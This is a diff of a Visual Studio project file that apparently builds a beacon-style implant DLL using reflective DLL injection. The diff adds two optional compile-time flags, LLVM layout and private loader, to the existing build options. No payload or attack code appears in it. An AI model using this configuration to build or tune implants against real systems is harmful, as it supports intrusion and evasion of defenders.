@@ -302,6 +302,10 @@
     <InjectPauseDefine Condition="'$(BeaconInjectPause)'!='true'"></InjectPauseDefine>
     <ExcRegDefine Condition="'$(BeaconNoExcReg)'=='true'">BW_NO_EXC_REG;</ExcRegDefine>
     <PlainSleepDefine Condition="'$(BeaconPlainSleep)'=='true'">BW_PLAIN_SLEEP;</PlainSleepDefine>
+    <LlvmLayoutDefine Condition="'$(BeaconLlvmLayout)'=='true'">BW_LLVM_LAYOUT;</LlvmLayoutDefine>
+    <LlvmLayoutDefine Condition="'$(BeaconLlvmLayout)'!='true'"></LlvmLayoutDefine>
+    <LoaderPrivateDefine Condition="'$(BeaconLoaderPrivate)'=='true'">BW_LOADER_PRIVATE;</LoaderPrivateDefine>
+    <LoaderPrivateDefine Condition="'$(BeaconLoaderPrivate)'!='true'"></LoaderPrivateDefine>
     <ExcRegDefine Condition="'$(BeaconNoExcReg)'!='true'"></ExcRegDefine>
   </PropertyGroup>
   <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'">
@@ -465,7 +469,7 @@ copy /Y "$(TargetPath)" "$(SolutionDir)bin\"</Command>
       <IntrinsicFunctions>true</IntrinsicFunctions>
       <FavorSizeOrSpeed>Size</FavorSizeOrSpeed>
       <WholeProgramOptimization>false</WholeProgramOptimization>
-      <PreprocessorDefinitions>$(ExcRegDefine)$(PlainSleepDefine)$(BofWinDefine)$(InjectPauseDefine)RefLoadSize=$(RefLoadSize);WIN64;NDEBUG;_WINDOWS;_USRDLL;WIN_X64;REFLECTIVE_DLL_EXPORTS;REFLECTIVEDLLINJECTION_VIA_LOADREMOTELIBRARYR;REFLECTIVEDLLINJECTION_CUSTOM_DLLMAIN;_CRT_SECURE_NO_WARNINGS;LTM_DESC;USE_LTM;WIN32_LEAN_AND_MEAN;BEACON_TIER3;%(PreprocessorDefinitions)</PreprocessorDefinitions>
+      <PreprocessorDefinitions>$(ExcRegDefine)$(PlainSleepDefine)$(LlvmLayoutDefine)$(LoaderPrivateDefine)$(BofWinDefine)$(InjectPauseDefine)RefLoadSize=$(RefLoadSize);WIN64;NDEBUG;_WINDOWS;_USRDLL;WIN_X64;REFLECTIVE_DLL_EXPORTS;REFLECTIVEDLLINJECTION_VIA_LOADREMOTELIBRARYR;REFLECTIVEDLLINJECTION_CUSTOM_DLLMAIN;_CRT_SECURE_NO_WARNINGS;LTM_DESC;USE_LTM;WIN32_LEAN_AND_MEAN;BEACON_TIER3;%(PreprocessorDefinitions)</PreprocessorDefinitions>
       <RuntimeLibrary>MultiThreaded</RuntimeLibrary>
       <FunctionLevelLinking>true</FunctionLevelLinking>
       <PrecompiledHeader />
